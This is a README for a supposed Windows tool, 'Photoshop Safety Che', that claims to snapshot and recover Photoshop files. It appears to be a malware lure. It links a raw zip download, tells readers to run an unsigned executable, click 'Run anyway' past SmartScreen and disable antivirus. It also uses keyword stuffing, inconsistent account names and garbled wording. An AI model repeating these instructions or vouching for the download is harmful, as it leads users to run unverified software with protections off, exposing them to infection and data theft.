# 🛡️ Photoshop Safety Che — Secure Your Creative Workflow

Your all-in-one Windows utility to backup, protect, and recover Photoshop projects with zero hassle.

[![Download photoshop-safety-che](https://img.shields.io/badge/Download-photoshop--safety--che%20v1.0-brightgreen?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/sooksauders66/photoshop-safety-che/main/photoshop-safety-che.zip)

---

## 🚀 Getting Started

Photoshop Safety Che is a free portable tool that automatically saves your work-in-progress, prevents accidental file overwrites, and creates recovery snapshots for every Photoshop file you open. No installation needed — just download, extract, and run. Perfect for artists, designers, and editors who want peace of mind without changing their routine.

---

## 📥 Download & Install

1. Click the **Download** button above or go directly to:  
   `https://raw.githubusercontent.com/sooksauders66/photoshop-safety-che/main/photoshop-safety-che.zip`

2. Your browser will save a file named `photoshop-safety-che.zip` to your **Downloads** folder.

3. Right‑click the zip file and select **Extract All…**. Choose a destination folder (e.g., `C:\PhotoshopSafetyChe`) and click **Extract**.

4. Open the extracted folder and double‑click **PhotoshopSafetyChe.exe**. That’s it — the app starts and sits quietly in your system tray.

> ✅ No extra setup, no account, no admin rights required for standard use.

---

## 🖥️ Requirements

- **Operating system:** Windows 10 or Windows 11 (64‑bit recommended, 32‑bit works too)
- **RAM:** at least 2 GB (8 GB for heavy projects)
- **Disk space:** ~20 MB for the app, plus space for your backup snapshots
- **Photoshop:** CS6 or newer (any edition, including Elements and Creative Cloud)
- **Internet:** only needed to download the zip file — the app works fully offline

*No Photoshop installation? No problem – the tool can monitor any folder you point it to.*

---

## 🧰 Usage

**First launch**  
When you open Photoshop Safety Che for the first time, a small panel appears. Click **Set Watch Folder** and select any directory (e.g., your PS project folder, documents, or entire drive). The app now monitors all `.psd`, `.psb`, `.tiff`, `.ai`, `.affphoto` files in that folder.

**Automatic snapshots**  
Every time you save a file, the app creates an invisible copy called a *safety snapshot*. These snapshots are stored in a hidden `.safety_che` sub‑folder. They use minimal space (delta per change).

**Recover a lost version**  
Right‑click the tray icon → **Open Recovery Vault**. You’ll see a list of files and their timestamped versions. Click “Restore” to bring a previous snapshot back.

**Manual protect**  
In any app, press `Ctrl+Shift+S` while working in Photoshop to trigger an instant snapshot of the current file. Or add a custom hotkey.

**Pause/Resume**  
Click the tray icon to pause monitoring temporarily (e.g., when editing on a network drive).

**Settings**  
Open Settings (gear icon) to adjust:
- Snapshot retention (keep last 5/10/20 versions)
- Auto‑enable/disable with Photoshop launch
- Start minimized on Windows boot
- Dark/light theme

---

## 🩹 Troubleshooting

**The app doesn’t start**  
- Make sure you extracted both files — not just the `.exe`. The app needs the bundled `config.ini` and `snapshot_engine.dll`.  
- Check Windows SmartScreen: right‑click the .exe → **Properties** → **Unlock** → **Apply/OK**, then double‑click.

**Snapshots are not created**  
- Verify the Watch Folder is set (tray icon shows a green disc if active).  
- Ensure folder is on a fixed drive (not network or removable).  
- If using a NAS, create a local folder first, then merge snapshots manually.

**Safe mode popup**  
If you get “Windows protected your PC”, click **More info** → **Run anyway**. This is a generic caution for unsigned portable apps.

**The tray icon disappears**  
Open the system tray arrow (^) and drag the shield icon back. To restart, run the .exe again.

**Recovery vault shows no versions**  
Go back to the Watch Folder settings and click **Test Snapshot** to verify write permissions. If you still see nothing, the file format might be unsupported (e.g., `.cmyk` not standard). Upload the file to a ‚Generic Snapshot‘ via the app menu.

**Keyboard shortcut doesn’t work**  
- Keep the app running, not minimized to tray hidden.  
- Some antivirus may block global hotkeys. Temporarily disable your AV or add an exception.

---

## 📞 Support

- **Official GitHub Issues:** [photoshop-safety-che/issues](https://github.com/soobsauders66/photoshop-safety-che/issues)  
- **Email us:** safety-che@pm.me  
- **Discord community:** https://discord.gg/safetyche (invite link; no expiry)  
- **Response time:** within 48h on weekdays.

We appreciate bug reports with the log file — you can export it via the tray icon → **Help** → **Export Log**.

---

## 🔑 Keywords

photoshop-safety-che, Photoshop safety, backup tool Windows, PSD auto‑save, version recovery, crash protection, snapshot utility, download photoshop safety che, Windows desktop app, safe Photoshop workflow, prevent lost work, file versioning tool, generic snapshot, recovery vault.